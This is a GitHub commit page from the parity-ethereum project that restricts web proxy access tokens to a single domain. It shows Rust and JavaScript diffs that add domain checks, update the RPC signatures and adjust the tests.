* [Actions](/openethereum/parity-ethereum/actions)
* [Projects](/openethereum/parity-ethereum/projects)
* [Security](/openethereum/parity-ethereum/security)
* [Insights](/openethereum/parity-ethereum/pulse)

## Commit

[Permalink](/openethereum/parity-ethereum/commit/53609f703e2f1af76441344ac3b72811c726a215)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Domain-locked web tokens. ([#5894](https://github.com/openethereum/parity-ethereum/pull/5894))

[Browse files](/openethereum/parity-ethereum/tree/53609f703e2f1af76441344ac3b72811c726a215)
Browse the repository at this point in the history

```
* Domain-locking web tokens.

* JS part.

* Fix linting issues.
```

* Loading branch information

[![@tomusdrw](https://avatars.githubusercontent.com/u/581548?s=40&v=4)](/tomusdrw) [![@gavofyork](https://avatars.githubusercontent.com/u/138296?s=40&v=4)](/gavofyork)

[tomusdrw](/openethereum/parity-ethereum/commits?author=tomusdrw "View all commits by tomusdrw")
authored and
[gavofyork](/openethereum/parity-ethereum/commits?author=gavofyork "View all commits by gavofyork")
committed
Jun 22, 2017

1 parent
[4d5280e](/openethereum/parity-ethereum/commit/4d5280e43c1f82ec2c09e35736e1bf8c2dad63c7)

commit 53609f7

 Show file tree

 Hide file tree

Showing
**13 changed files**
with
**85 additions**
and
**48 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* dapps/src

  + dapps/src/lib.rs
    [lib.rs](#diff-c268787b6b0b74b994faccc882638c07748cf6016fa7814b295552817517b4a7)
  + tests

    - dapps/src/tests/fetch.rs
      [fetch.rs](#diff-d46003d5080fb5f9ee9acd3df18740cc5bdb1a93921cf07178b643eb78810467)
    - helpers

      * dapps/src/tests/helpers/mod.rs
        [mod.rs](#diff-653342aceb9eb0c975494c73a584b6ef8f03430ae6c6283d42d53f94e5e70ca5)
  + dapps/src/web.rs
    [web.rs](#diff-ccecf15e2a2acaed98394a9eb4b95fe8cd1114e6b87fe35e9576a280da573bb2)
* js/src

  + api/rpc/signer

    - js/src/api/rpc/signer/signer.js
      [signer.js](#diff-4dee2fd4fd543922351df641d7d94441cf3d445d644dee67809b2fbbc8d8f357)
  + jsonrpc/interfaces

    - js/src/jsonrpc/interfaces/signer.js
      [signer.js](#diff-402e45e078af88d9f943f5e099a47af3e8b3a1eeb1611f5275cc6ec273742c52)
  + views/Web

    - js/src/views/Web/store.js
      [store.js](#diff-878b30b940c8a2f3b6f9f9b75977d5dfe463fac0d48126ad3c905e83fb9fec80)
    - js/src/views/Web/store.spec.js
      [store.spec.js](#diff-ce91d92e6be6eee21b4b84a1bc5c8e88d6eb2904c0fb06a0858fad9a1237f00d)
    - js/src/views/Web/web.js
      [web.js](#diff-2e11248aaa5b7778d92858dad4c7f4a03b50dcda0a51bb84964e5c616acfb7ce)
* parity

  + parity/dapps.rs
    [dapps.rs](#diff-2ea70b428c304b4bed89a4bf27c4eb0f6ba0a9af6114d43d2da6b2403d6d9b3f)
* rpc/src/v1

  + helpers

    - rpc/src/v1/helpers/signer.rs
      [signer.rs](#diff-cdc9ee2b72dacbc6c39a22e400243f9a889ff1b552c2b5da0db6499d555aabb6)
  + impls

    - rpc/src/v1/impls/signer.rs
      [signer.rs](#diff-1ba5c1f1e734f7270eb2197dbb52fe3d5086512fac266698be7502009ab2b4fb)
  + traits

    - rpc/src/v1/traits/signer.rs
      [signer.rs](#diff-2df4693a051239063b90d440b584e947d852295abed83a36687b7952fd49e44f)

## There are no files selected for viewing

10 changes: 5 additions & 5 deletions

10
[dapps/src/lib.rs](#diff-c268787b6b0b74b994faccc882638c07748cf6016fa7814b295552817517b4a7 "dapps/src/lib.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/dapps/src/lib.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -71,7 +71,7 @@ use std::path::PathBuf; |
|  |  | use std::sync::Arc; |
|  |  | use std::collections::HashMap; |
|  |  |  |
|  |  | use jsonrpc\_http\_server::{self as http, hyper}; |
|  |  | use jsonrpc\_http\_server::{self as http, hyper, Origin}; |
|  |  |  |
|  |  | use fetch::Fetch; |
|  |  | use parity\_reactor::Remote; |
| Expand All | | @@ -90,12 +90,12 @@ impl<F> SyncStatus for F where F: Fn() -> bool + Send + Sync { |
|  |  |  |
|  |  | /// Validates Web Proxy tokens |
|  |  | pub trait WebProxyTokens: Send + Sync { |
|  |  | /// Should return true if token is a valid web proxy access token. |
|  |  | fn is\_web\_proxy\_token\_valid(&self, token: &str) -> bool; |
|  |  | /// Should return a domain allowed to be accessed by this token or `None` if the token is not valid |
|  |  | fn domain(&self, token: &str) -> Option<Origin>; |
|  |  | } |
|  |  |  |
|  |  | impl<F> WebProxyTokens for F where F: Fn(String) -> bool + Send + Sync { |
|  |  | fn is\_web\_proxy\_token\_valid(&self, token: &str) -> bool { self(token.to\_owned()) } |
|  |  | impl<F> WebProxyTokens for F where F: Fn(String) -> Option<Origin> + Send + Sync { |
|  |  | fn domain(&self, token: &str) -> Option<Origin> { self(token.to\_owned()) } |
|  |  | } |
|  |  |  |
|  |  | /// Current supported endpoints. |
| Expand Down | |  |

40 changes: 31 additions & 9 deletions

40
[dapps/src/tests/fetch.rs](#diff-d46003d5080fb5f9ee9acd3df18740cc5bdb1a93921cf07178b643eb78810467 "dapps/src/tests/fetch.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/dapps/src/tests/fetch.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -312,7 +312,7 @@ fn should\_encode\_and\_decode\_base32() { |
|  |  | #[test] |
|  |  | fn should\_stream\_web\_content() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -335,7 +335,7 @@ fn should\_stream\_web\_content() { |
|  |  | #[test] |
|  |  | fn should\_support\_base32\_encoded\_web\_urls() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -358,7 +358,7 @@ fn should\_support\_base32\_encoded\_web\_urls() { |
|  |  | #[test] |
|  |  | fn should\_correctly\_handle\_long\_label\_when\_splitted() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("xolrg9fePeQyKLnL"); |
|  |  | let (server, fetch) = serve\_with\_fetch("xolrg9fePeQyKLnL", "https://contribution.melonport.com"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -382,7 +382,7 @@ fn should\_correctly\_handle\_long\_label\_when\_splitted() { |
|  |  | #[test] |
|  |  | fn should\_support\_base32\_encoded\_web\_urls\_as\_path() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -402,10 +402,32 @@ fn should\_support\_base32\_encoded\_web\_urls\_as\_path() { |
|  |  | fetch.assert\_no\_more\_requests(); |
|  |  | } |
|  |  |  |
|  |  | #[test] |
|  |  | fn should\_return\_error\_on\_non\_whitelisted\_domain() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://ethcore.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
|  |  | "\ |
|  |  | GET / HTTP/1.1\r\n\ |
|  |  | Host: EHQPPSBE5DM78X3GECX2YBVGC5S6JX3S5SMPY.web.web3.site\r\n\ |
|  |  | Connection: close\r\n\ |
|  |  | \r\n\ |
|  |  | " |
|  |  | ); |
|  |  |  |
|  |  | // then |
|  |  | response.assert\_status("HTTP/1.1 400 Bad Request"); |
|  |  | assert\_security\_headers\_for\_embed(&response.headers); |
|  |  |  |
|  |  | fetch.assert\_no\_more\_requests(); |
|  |  | } |
|  |  |  |
|  |  | #[test] |
|  |  | fn should\_return\_error\_on\_invalid\_token() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("test"); |
|  |  | let (server, fetch) = serve\_with\_fetch("test", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -427,7 +449,7 @@ fn should\_return\_error\_on\_invalid\_token() { |
|  |  | #[test] |
|  |  | fn should\_return\_error\_on\_invalid\_protocol() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "ftp://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -449,7 +471,7 @@ fn should\_return\_error\_on\_invalid\_protocol() { |
|  |  | #[test] |
|  |  | fn should\_disallow\_non\_get\_requests() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -474,7 +496,7 @@ fn should\_disallow\_non\_get\_requests() { |
|  |  | #[test] |
|  |  | fn should\_fix\_absolute\_requests\_based\_on\_referer() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand All | | @@ -497,7 +519,7 @@ fn should\_fix\_absolute\_requests\_based\_on\_referer() { |
|  |  | #[test] |
|  |  | fn should\_fix\_absolute\_requests\_based\_on\_referer\_in\_url() { |
|  |  | // given |
|  |  | let (server, fetch) = serve\_with\_fetch("token"); |
|  |  | let (server, fetch) = serve\_with\_fetch("token", "https://parity.io"); |
|  |  |  |
|  |  | // when |
|  |  | let response = request(server, |
| Expand Down | |  |

8 changes: 5 additions & 3 deletions

8
[dapps/src/tests/helpers/mod.rs](#diff-653342aceb9eb0c975494c73a584b6ef8f03430ae6c6283d42d53f94e5e70ca5 "dapps/src/tests/helpers/mod.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/dapps/src/tests/helpers/mod.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -100,13 +100,15 @@ pub fn serve\_with\_registrar\_and\_fetch\_and\_threads(multi\_threaded: bool) -> (Serv |
|  |  | (server, fetch, reg) |
|  |  | } |
|  |  |  |
|  |  | pub fn serve\_with\_fetch(web\_token: &'static str) -> (Server, FakeFetch) { |
|  |  | pub fn serve\_with\_fetch(web\_token: &'static str, domain: &'static str) -> (Server, FakeFetch) { |
|  |  | let fetch = FakeFetch::default(); |
|  |  | let f = fetch.clone(); |
|  |  | let (server, \_) = init\_server(move |builder| { |
|  |  | builder |
|  |  | .fetch(f.clone()) |
|  |  | .web\_proxy\_tokens(Arc::new(move |token| &token == web\_token)) |
|  |  | .web\_proxy\_tokens(Arc::new(move |token| { |
|  |  | if &token == web\_token { Some(domain.into()) } else { None } |
|  |  | })) |
|  |  | }, Default::default(), Remote::new\_sync()); |
|  |  |  |
|  |  | (server, fetch) |
| Expand Down  Expand Up | | @@ -147,7 +149,7 @@ impl ServerBuilder { |
|  |  | dapps\_path: dapps\_path.as\_ref().to\_owned(), |
|  |  | registrar: registrar, |
|  |  | sync\_status: Arc::new(|| false), |
|  |  | web\_proxy\_tokens: Arc::new(|\_| false), |
|  |  | web\_proxy\_tokens: Arc::new(|\_| None), |
|  |  | signer\_address: None, |
|  |  | allowed\_hosts: DomainsValidation::Disabled, |
|  |  | remote: remote, |
| Expand Down | |  |

12 changes: 9 additions & 3 deletions

12
[dapps/src/web.rs](#diff-ccecf15e2a2acaed98394a9eb4b95fe8cd1114e6b87fe35e9576a280da573bb2 "dapps/src/web.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/dapps/src/web.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -133,14 +133,14 @@ impl<F: Fetch> WebHandler<F> { |
|  |  | let target\_url = token\_it.next(); |
|  |  |  |
|  |  | // Check if token supplied in URL is correct. |
|  |  | match token { |
|  |  | Some(token) if self.web\_proxy\_tokens.is\_web\_proxy\_token\_valid(token) => {}, |
|  |  | let domain = match token.and\_then(|token| self.web\_proxy\_tokens.domain(token)) { |
|  |  | Some(domain) => domain, |
|  |  | \_ => { |
|  |  | return Err(State::Error(ContentHandler::error( |
|  |  | StatusCode::BadRequest, "Invalid Access Token", "Invalid or old web proxy access token supplied.", Some("Try refreshing the page."), self.embeddable\_on.clone() |
|  |  | ))); |
|  |  | } |
|  |  | } |
|  |  | }; |
|  |  |  |
|  |  | // Validate protocol |
|  |  | let mut target\_url = match target\_url { |
| Expand All | | @@ -152,6 +152,12 @@ impl<F: Fetch> WebHandler<F> { |
|  |  | } |
|  |  | }; |
|  |  |  |
|  |  | if !target\_url.starts\_with(&\*domain) { |
|  |  | return Err(State::Error(ContentHandler::error( |
|  |  | StatusCode::BadRequest, "Invalid Domain", "Dapp attempted to access invalid domain.", Some(&target\_url), self.embeddable\_on.clone(), |
|  |  | ))); |
|  |  | } |
|  |  |  |
|  |  | if !target\_url.ends\_with("/") { |
|  |  | target\_url = format!("{}/", target\_url); |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[js/src/api/rpc/signer/signer.js](#diff-4dee2fd4fd543922351df641d7d94441cf3d445d644dee67809b2fbbc8d8f357 "js/src/api/rpc/signer/signer.js")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/js/src/api/rpc/signer/signer.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -42,9 +42,9 @@ export default class Signer { |
|  |  | .execute('signer\_generateAuthorizationToken'); |
|  |  | } |
|  |  |  |
|  |  | generateWebProxyAccessToken () { |
|  |  | generateWebProxyAccessToken (domain) { |
|  |  | return this.\_transport |
|  |  | .execute('signer\_generateWebProxyAccessToken'); |
|  |  | .execute('signer\_generateWebProxyAccessToken', domain); |
|  |  | } |
|  |  |  |
|  |  | rejectRequest (requestId) { |
| Expand Down | |  |

6 changes: 5 additions & 1 deletion

6
[js/src/jsonrpc/interfaces/signer.js](#diff-402e45e078af88d9f943f5e099a47af3e8b3a1eeb1611f5275cc6ec273742c52 "js/src/jsonrpc/interfaces/signer.js")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/js/src/jsonrpc/interfaces/signer.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,7 +30,11 @@ export default { |
|  |  |  |
|  |  | generateWebProxyAccessToken: { |
|  |  | desc: 'Generates a new web proxy access token.', |
|  |  | params: [], |
|  |  | params: [{ |
|  |  | type: String, |
|  |  | desc: 'Domain for which the token is valid. Only requests to this domain will be allowed.', |
|  |  | example: 'https://parity.io' |
|  |  | }], |
|  |  | returns: { |
|  |  | type: String, |
|  |  | desc: 'The new web proxy access token.', |
| Expand Down | |  |

20 changes: 11 additions & 9 deletions

20
[js/src/views/Web/store.js](#diff-878b30b940c8a2f3b6f9f9b75977d5dfe463fac0d48126ad3c905e83fb9fec80 "js/src/views/Web/store.js")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/js/src/views/Web/store.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -59,15 +59,17 @@ export default class Store { |
|  |  | } |
|  |  |  |
|  |  | @action gotoUrl = (\_url) => { |
|  |  | transaction(() => { |
|  |  | let url = (\_url || this.nextUrl).trim().replace(/\/+$/, ''); |
|  |  | let url = (\_url || this.nextUrl).trim().replace(/\/+$/, ''); |
|  |  |  |
|  |  | if (!hasProtocol.test(url)) { |
|  |  | url = `https://${url}`; |
|  |  | } |
|  |  | if (!hasProtocol.test(url)) { |
|  |  | url = `https://${url}`; |
|  |  | } |
|  |  |  |
|  |  | this.setNextUrl(url); |
|  |  | this.setCurrentUrl(this.nextUrl); |
|  |  | return this.generateToken(url).then(() => { |
|  |  | transaction(() => { |
|  |  | this.setNextUrl(url); |
|  |  | this.setCurrentUrl(this.nextUrl); |
|  |  | }); |
|  |  | }); |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -134,11 +136,11 @@ export default class Store { |
|  |  | this.nextUrl = url; |
|  |  | } |
|  |  |  |
|  |  | generateToken = () => { |
|  |  | generateToken = (\_url) => { |
|  |  | this.setToken(null); |
|  |  |  |
|  |  | return this.\_api.signer |
|  |  | .generateWebProxyAccessToken() |
|  |  | .generateWebProxyAccessToken(\_url) |
|  |  | .then((token) => { |
|  |  | this.setToken(token); |
|  |  | }) |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[js/src/views/Web/store.spec.js](#diff-ce91d92e6be6eee21b4b84a1bc5c8e88d6eb2904c0fb06a0858fad9a1237f00d "js/src/views/Web/store.spec.js")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/js/src/views/Web/store.spec.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -62,15 +62,16 @@ describe('views/Web/Store', () => { |
|  |  | describe('gotoUrl', () => { |
|  |  | it('uses the nextUrl when none specified', () => { |
|  |  | store.setNextUrl('https://parity.io'); |
|  |  | store.gotoUrl(); |
|  |  |  |
|  |  | expect(store.currentUrl).to.equal('https://parity.io'); |
|  |  | return store.gotoUrl().then(() => { |
|  |  | expect(store.currentUrl).to.equal('https://parity.io'); |
|  |  | }); |
|  |  | }); |
|  |  |  |
|  |  | it('adds https when no protocol', () => { |
|  |  | store.gotoUrl('google.com'); |
|  |  |  |
|  |  | expect(store.currentUrl).to.equal('https://google.com'); |
|  |  | return store.gotoUrl('google.com').then(() => { |
|  |  | expect(store.currentUrl).to.equal('https://google.com'); |
|  |  | }); |
|  |  | }); |
|  |  | }); |
|  |  |  |
| Expand Down | |  |

1 change: 0 additions & 1 deletion

1
[js/src/views/Web/web.js](#diff-2e11248aaa5b7778d92858dad4c7f4a03b50dcda0a51bb84964e5c616acfb7ce "js/src/views/Web/web.js")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/js/src/views/Web/web.js)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -37,7 +37,6 @@ export default class Web extends Component { |
|  |  |  |
|  |  | componentDidMount () { |
|  |  | this.store.gotoUrl(this.props.params.url); |
|  |  | return this.store.generateToken(); |
|  |  | } |
|  |  |  |
|  |  | componentWillReceiveProps (props) { |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[parity/dapps.rs](#diff-2ea70b428c304b4bed89a4bf27c4eb0f6ba0a9af6114d43d2da6b2403d6d9b3f "parity/dapps.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/parity/dapps.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -232,7 +232,7 @@ mod server { |
|  |  | ) -> Result<Middleware, String> { |
|  |  | let signer = deps.signer; |
|  |  | let parity\_remote = parity\_reactor::Remote::new(deps.remote.clone()); |
|  |  | let web\_proxy\_tokens = Arc::new(move |token| signer.is\_valid\_web\_proxy\_access\_token(&token)); |
|  |  | let web\_proxy\_tokens = Arc::new(move |token| signer.web\_proxy\_access\_token\_domain(&token)); |
|  |  |  |
|  |  | Ok(parity\_dapps::Middleware::dapps( |
|  |  | parity\_remote, |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[rpc/src/v1/helpers/signer.rs](#diff-cdc9ee2b72dacbc6c39a22e400243f9a889ff1b552c2b5da0db6499d555aabb6 "rpc/src/v1/helpers/signer.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/rpc/src/v1/helpers/signer.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,6 +16,7 @@ |
|  |  |  |
|  |  | use std::sync::Arc; |
|  |  | use std::ops::Deref; |
|  |  | use http::Origin; |
|  |  | use util::Mutex; |
|  |  | use transient\_hashmap::TransientHashMap; |
|  |  |  |
| Expand All | | @@ -29,7 +30,7 @@ const TOKEN\_LIFETIME\_SECS: u32 = 3600; |
|  |  | pub struct SignerService { |
|  |  | is\_enabled: bool, |
|  |  | queue: Arc<ConfirmationsQueue>, |
|  |  | web\_proxy\_tokens: Mutex<TransientHashMap<String, ()>>, |
|  |  | web\_proxy\_tokens: Mutex<TransientHashMap<String, Origin>>, |
|  |  | generate\_new\_token: Box<Fn() -> Result<String, String> + Send + Sync + 'static>, |
|  |  | } |
|  |  |  |
| Expand All | | @@ -46,16 +47,16 @@ impl SignerService { |
|  |  | } |
|  |  |  |
|  |  | /// Checks if the token is valid web proxy access token. |
|  |  | pub fn is\_valid\_web\_proxy\_access\_token(&self, token: &String) -> bool { |
|  |  | self.web\_proxy\_tokens.lock().contains\_key(&token) |
|  |  | pub fn web\_proxy\_access\_token\_domain(&self, token: &String) -> Option<Origin> { |
|  |  | self.web\_proxy\_tokens.lock().get(token).cloned() |
|  |  | } |
|  |  |  |
|  |  | /// Generates a new web proxy access token. |
|  |  | pub fn generate\_web\_proxy\_access\_token(&self) -> String { |
|  |  | pub fn generate\_web\_proxy\_access\_token(&self, domain: Origin) -> String { |
|  |  | let token = random\_string(16); |
|  |  | let mut tokens = self.web\_proxy\_tokens.lock(); |
|  |  | tokens.prune(); |
|  |  | tokens.insert(token.clone(), ()); |
|  |  | tokens.insert(token.clone(), domain); |
|  |  | token |
|  |  | } |
|  |  |  |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[rpc/src/v1/impls/signer.rs](#diff-1ba5c1f1e734f7270eb2197dbb52fe3d5086512fac266698be7502009ab2b4fb "rpc/src/v1/impls/signer.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/rpc/src/v1/impls/signer.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -245,8 +245,8 @@ impl<D: Dispatcher + 'static> Signer for SignerClient<D> { |
|  |  | .map\_err(|e| errors::token(e)) |
|  |  | } |
|  |  |  |
|  |  | fn generate\_web\_proxy\_token(&self) -> Result<String, Error> { |
|  |  | Ok(self.signer.generate\_web\_proxy\_access\_token()) |
|  |  | fn generate\_web\_proxy\_token(&self, domain: String) -> Result<String, Error> { |
|  |  | Ok(self.signer.generate\_web\_proxy\_access\_token(domain.into())) |
|  |  | } |
|  |  |  |
|  |  | fn subscribe\_pending(&self, \_meta: Self::Metadata, sub: Subscriber<Vec<ConfirmationRequest>>) { |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[rpc/src/v1/traits/signer.rs](#diff-2df4693a051239063b90d440b584e947d852295abed83a36687b7952fd49e44f "rpc/src/v1/traits/signer.rs")

Show comments

[View file](/openethereum/parity-ethereum/blob/53609f703e2f1af76441344ac3b72811c726a215/rpc/src/v1/traits/signer.rs)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -51,9 +51,9 @@ build\_rpc\_trait! { |
|  |  | #[rpc(name = "signer\_generateAuthorizationToken")] |
|  |  | fn generate\_token(&self) -> Result<String, Error>; |
|  |  |  |
|  |  | /// Generates new web proxy access token. |
|  |  | /// Generates new web proxy access token for particular domain. |
|  |  | #[rpc(name = "signer\_generateWebProxyAccessToken")] |
|  |  | fn generate\_web\_proxy\_token(&self) -> Result<String, Error>; |
|  |  | fn generate\_web\_proxy\_token(&self, String) -> Result<String, Error>; |
|  |  |  |
|  |  | #[pubsub(name = "signer\_pending")] { |
|  |  | /// Subscribe to new pending requests on signer interface. |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `53609f7`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenethereum%2Fparity-ethereum%2Fcommit%2F53609f703e2f1af76441344ac3b72811c726a215) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


